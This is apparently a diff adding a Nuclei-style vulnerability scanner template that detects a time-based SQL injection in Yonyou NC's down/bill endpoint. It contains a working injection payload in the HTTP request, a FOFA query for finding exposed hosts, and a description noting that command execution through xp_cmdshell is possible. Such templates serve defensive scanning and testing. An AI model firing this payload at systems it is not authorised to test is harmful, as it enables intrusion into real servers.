@@ -1,0 +1,37 @@
+http:
+- matchers:
+  - condition: and
+    dsl:
+    - duration>=4
+    - status_code == 500
+    type: dsl
+  raw:
+  - '@timeout: 10s
+
+    GET /portal/pt/erfile/down/bill?pageId=login&id=1''+AND+4563=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),4)--
+    HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Accept-Charset: utf-8
+
+    '
+id: yonyou-nc-down-bill-sqli
+info:
+  author: Co5mos
+  description: "\u7528\u53CBNC //portal/pt/erfile/down/bill\u63A5\u53E3\u7684id\u53C2\
+    \u6570\u5B58\u5728SQL\u6CE8\u5165\u6F0F\u6D1E\uFF0C\u653B\u51FB\u8005\u901A\u8FC7\
+    \u5229\u7528SQL\u6CE8\u5165\u6F0F\u6D1E\u914D\u5408\u6570\u636E\u5E93xp_cmdshell\u53EF\
+    \u4EE5\u6267\u884C\u4EFB\u610F\u547D\u4EE4\uFF0C\u4ECE\u800C\u63A7\u5236\u670D\
+    \u52A1\u5668\u3002\u7ECF\u8FC7\u5206\u6790\u4E0E\u7814\u5224\uFF0C\u8BE5\u6F0F\
+    \u6D1E\u5229\u7528\u96BE\u5EA6\u4F4E\uFF0C\u5EFA\u8BAE\u5C3D\u5FEB\u4FEE\u590D\
+    \u3002\n"
+  metadata:
+    fofa-query: icon_hash="1085941792" && body="/logo/images/logo.gif"
+  name: Yonyou NC down/bill - SQL Injection
+  reference:
+  - https://github.com/wy876/POC/blob/437fad5c987d7a15441fd5e05cb793b08181809b/%E7%94%A8%E5%8F%8BNC-bill%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  severity: high
+  tags: yonyou,sqli
